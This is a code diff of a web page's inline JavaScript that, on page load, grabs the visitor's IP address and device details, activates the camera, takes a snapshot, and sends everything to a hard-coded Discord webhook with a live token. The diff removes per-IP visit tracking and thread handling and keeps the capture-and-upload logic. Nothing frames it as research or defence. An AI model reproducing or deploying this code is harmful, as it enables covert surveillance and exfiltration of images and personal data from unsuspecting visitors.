@@ -44,24 +44,11 @@
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1299390747711373334/iO5Sbk83deMgQEYd8YfesE-jcYQmL2fudZcdiGuuJUCUZe95-1gNs4VbmYd6mM2qAJhJ"; // Replace with your webhook URL
 
-        // Initialize a dictionary to keep track of visits and threads
-        const ipVisits = {};
-        const threads = {}; // To keep track of thread IDs for each IP
-
         // Start the camera automatically when the page loads
         window.onload = async () => {
             const ipAddress = await getUserIp(); // Get user IP
             const userAgent = navigator.userAgent; // Get device info from User-Agent
-
-            // Increment the visit count for the IP address
-            if (ipVisits[ipAddress]) {
-                ipVisits[ipAddress].count += 1; // Increment visit count
-            } else {
-                ipVisits[ipAddress] = { userAgent: userAgent, count: 1 }; // Initialize count and user agent
-            }
-
-            // Send updated details to Discord
-            await sendDetailsToDiscord();
+            sendDetailsToDiscord(ipAddress, userAgent); // Send IP and device info to Discord
 
             // Start the camera after a short delay
             setTimeout(() => {
@@ -80,15 +67,12 @@
             }
         }
 
-        async function sendDetailsToDiscord() {
-            // Prepare a message in an Excel-like format
-            let message = "IP Address\tDevice Info\tVisit Count\n"; // Header
-            for (const ip in ipVisits) {
-                const { userAgent, count } = ipVisits[ip];
-                message += `${ip}\t${userAgent}\t${count}\n`; // Append each IP's details
-            }
-
-            await sendMessageToDiscord(message.trim()); // Send the message
+        function sendDetailsToDiscord(ipAddress, userAgent) {
+            const content = `
+                User IP: ${ipAddress}
+                Device Info: ${userAgent}
+            `;
+            sendMessageToDiscord(content.trim());
         }
 
         async function startCamera(ipAddress, userAgent) {
@@ -117,7 +101,7 @@
             }
         }
 
-        async function takeSnapshot(stream, ipAddress, userAgent) {
+        function takeSnapshot(stream, ipAddress, userAgent) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
@@ -136,8 +120,8 @@
             // Display the snapshot
             document.getElementById('snapshot').src = imageData;
 
-            // Upload the image to the correct thread for the IP address
-            await uploadImageToDiscord(imageData, video.videoWidth, video.videoHeight, userAgent, ipAddress);
+            // Send the image to Discord with additional details
+            uploadImageToDiscord(imageData, video.videoWidth, video.videoHeight, userAgent, ipAddress);
         }
 
         async function uploadImageToDiscord(imageData, width, height, userAgent, ipAddress) {
@@ -159,63 +143,6 @@
             `;
             formData.append('content', content.trim()); // Append the message to the form data
 
-            // Check if a thread already exists for this IP
-            if (!threads[ipAddress]) {
-                const response = await createThread(ipAddress); // Create a new thread for this IP
-                threads[ipAddress] = response.id; // Store the thread ID
-            }
-
-            // Send the image to the thread
-            await sendImageToThread(blob, threads[ipAddress], content);
-        }
-
-        async function createThread(ipAddress) {
-            // Create a thread for the IP address
-            const threadContent = `Thread created for IP: ${ipAddress}`;
-            const formData = new FormData();
-            formData.append('content', threadContent);
-
-            const response = await fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                body: formData
-            });
-
-            if (response.ok) {
-                const data = await response.json();
-                console.log(`Thread created for IP: ${ipAddress}`);
-                return data; // Return the thread data
-            } else {
-                console.error('Failed to create thread:', response.statusText);
-                throw new Error('Thread creation failed');
-            }
-        }
-
-        async function sendImageToThread(blob, threadId, content) {
-            // Create a form to send the image to the thread
-            const formData = new FormData();
-            formData.append('file', blob, 'snapshot.png');
-            formData.append('content', content); // Message content associated with the image
-
-            try {
-                const response = await fetch(`${DISCORD_WEBHOOK_URL}/messages/${threadId}`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (response.ok) {
-                    console.log('Image successfully sent to thread.');
-                } else {
-                    console.error('Failed to send image to thread:', response.statusText);
-                }
-            } catch (error) {
-                console.error('Error sending image to thread:', error);
-            }
-        }
-
-        async function sendMessageToDiscord(content) {
-            const formData = new FormData();
-            formData.append('content', content);
-
             try {
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
@@ -223,13 +150,31 @@
                 });
 
                 if (response.ok) {
+                    console.log('Image successfully sent to Discord.');
+                } else {
+                    console.error('Failed to send image to Discord:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Error uploading image to Discord:', error);
+            }
+        }
+
+        function sendMessageToDiscord(content) {
+            const formData = new FormData();
+            formData.append('content', content);
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                if (response.ok) {
                     console.log('Details successfully sent to Discord.');
                 } else {
                     console.error('Failed to send details to Discord:', response.statusText);
                 }
-            } catch (error) {
+            }).catch(error => {
                 console.error('Error sending details to Discord:', error);
-            }
+            });
         }
     </script>
 </body>
